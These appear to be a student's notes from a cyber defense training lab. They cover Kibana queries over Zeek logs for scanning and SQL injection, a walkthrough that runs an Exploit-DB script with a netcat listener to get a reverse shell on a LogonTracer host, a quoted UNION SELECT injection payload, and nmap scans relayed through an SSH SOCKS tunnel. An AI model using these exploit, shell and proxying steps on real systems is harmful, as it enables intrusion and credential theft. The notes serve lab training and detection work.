Run the following query to filter for only Zeek connection logs.

event.dataset:conn

Toggle the following fields:

source.ip 

destination.ip 

destination.port 

connection.state

client.packets

server.packets


![image](https://github.com/user-attachments/assets/5df234ea-0198-4c45-8c6b-01dcd9a5a0fd)



Run the following query to search for scanning behavior:

event.dataset:conn and source.ip:199.63.64.51 and ((client.packets>=1 and client.packets<=3) and server.packets<=1)

![image](https://github.com/user-attachments/assets/931358f3-7636-4ea6-8b85-a4ea435b861e)


Filter for HTTP logs by running the following query:

event.dataset:http

Toggle the following fields:

source.ip

destination.ip

http.status_code

http.uri

http.request.body.length

http.response.body.length


![image](https://github.com/user-attachments/assets/f9b0dd53-f275-42c3-a4b9-28569e052cc6)


run the following query to filter out web connections from different hosts:

event.dataset:http and source.ip:199.63.64.51

notice the stranges uri's

![image](https://github.com/user-attachments/assets/87f37e22-f64f-485c-9d29-dd33a878a1ec)


#### CDAH-M7L2 Finding and Using an Exploit #### 

Run the following command to search for exploits related to OpenSSH:
(trainee@dmss-kali)-[~] $ searchsploit openssh

Run the following command to search for exploits related to Wekzeug HTTPD:
(trainee@dmss-kali)-[~] $ searchsploit wekzeug

 Run the following command to search for exploits related to LogonTracer:
(trainee@dmss-kali)-[~] $ searchsploit logontracer

Run the following command to find the full path of the exploit. -p specifies the full path given an exploit ID and copies it to the clipboard, if possible.
(trainee@dmss-kali)-[~] $ searchsploit -p 49918

Run the following command to read the exploit script:
(trainee@dmss-kali)-[~] $ less -N /usr/share/exploitdb/exploits/multiple/webapps/49918.py

Run the following command to print the exploit script's help menu:
(trainee@dmss-kali)-[~] $ python3 /usr/share/exploitdb/exploits/multiple/webapps/49918.py -h

 Start a listener before running the exploit, as the exploited host needs something to call back to. The port is somewhat arbitrary. In this case, 4444 is used.
(trainee@dmss-kali)-[~] $ nc -nlvp 4444

Open a new tab or window, and run the following command to run the exploit:
(trainee@dmss-kali)-[~] $ python3 /usr/share/exploitdb/exploits/multiple/webapps/49918.py 199.63.64.51 4444 http://200.200.200.10:8080

Run a command to check the functionality of the shell.
(trainee@dmss-kali)-[~] $ /usr/local/src/LogonTracer # whoami

---------------------------------------------------------

![image](https://github.com/user-attachments/assets/a074d8d5-bc35-43dc-9528-4ea5bbd62ca5)


-------------------------------------------------------------------

CDAH-M7L3 Web Application Attacks

 look for union in certain logs

search for UNION+SELECT
![image](https://github.com/user-attachments/assets/0447e933-1ad4-4384-82cc-db9f5592d149)

Operators in SQL use characters to manipulate and find data within the database. A common operator that is utilized in an SQLI attack is UNION. The UNION operator is used in SQL to combine two or more SELECT statements. Additionally, the UNION operator can be used to retrieve data from multiple tables within a database. The UNION operator can help the adversary discover table s, columns,  users, and file paths. 

also search for script and get time stamp

![image](https://github.com/user-attachments/assets/21dac7be-1a4b-43a2-9f11-b812367e8cbc)


![image](https://github.com/user-attachments/assets/fb413ff3-19b2-4871-b637-4b0c5406cb85)

![image](https://github.com/user-attachments/assets/a9d396e2-226a-489b-a198-6993424be159)



![image](https://github.com/user-attachments/assets/fae52e80-3474-40e9-9636-c0e20490ea1e)


![image](https://github.com/user-attachments/assets/0b048432-e84c-4c85-b6eb-dca6fe9b9567)

![image](https://github.com/user-attachments/assets/5a50dbea-4301-4297-904d-88933600caaf)


![image](https://github.com/user-attachments/assets/874b775c-34ba-48f6-8dbe-786c2a6b402f)

![image](https://github.com/user-attachments/assets/3dd4c9a2-a67f-4a2f-a2bd-449ac9389932)

![image](https://github.com/user-attachments/assets/1bad4db4-39e3-4bc2-985a-dd73231d6a97)

![image](https://github.com/user-attachments/assets/a31ad09d-68e1-41bb-8323-57b0e8034fc4)

SQLI 12:39:14 Attack Query
The following query was executed by the adversary:

'UNION ALL SELECT current_user(),user() #
﻿

NOTE: The use of the ', UNION, and # should immediately tip off the analyst. As demonstrated and discussed throughout the lesson, these characters are used to exploit a web application's design and gain access to otherwise protected information.  

![image](https://github.com/user-attachments/assets/6a87e0ae-bcc7-4d95-b563-a95b1279b3df)

Information Obtained
The SQLI attack on the network helped the adversary gain information about the current database user. This information contains portions of the user's credentials. The credential information obtained may lead the adversary to perform other types of attacks in an attempt to break into the user's account. To mitigate this attack, measures to sanitize input in the network application portal must be enacted. 


----------------------------------------------------

########### CDAH-M7L4 Stack Exploitation ############


####### CDAH-M7L6 Credential Stuffing/Password Cracking #######

GPO -> default domain -> settings -> security settings -> account policies/password policy

CDAH-M7L7 Using an Attack Proxy

In order to save time, only the top 25 ports are scanned.

nmap -Pn --top-ports 25 128.0.7.25

![image](https://github.com/user-attachments/assets/5ef6383a-d07b-4aef-ab28-2507fb92c6aa)

Create a dynamic SSH tunnel between the attacker machine and a peer device that has been co-opted for use in this reconnaissance campaign.

ssh -D 0.0.0.0:9050 -N -f trainee@128.0.7.207

![image](https://github.com/user-attachments/assets/adf25577-a15b-49ed-9c27-a56e741a242f)


Execute the same scan again, but this time, direct all traffic through the proxy SOCKS4 created by the SSH tunnel.

proxychains nmap -Pn --top-ports 25 128.0.7.25


![image](https://github.com/user-attachments/assets/1800679c-659d-47ed-a69a-4c6729938d64)



























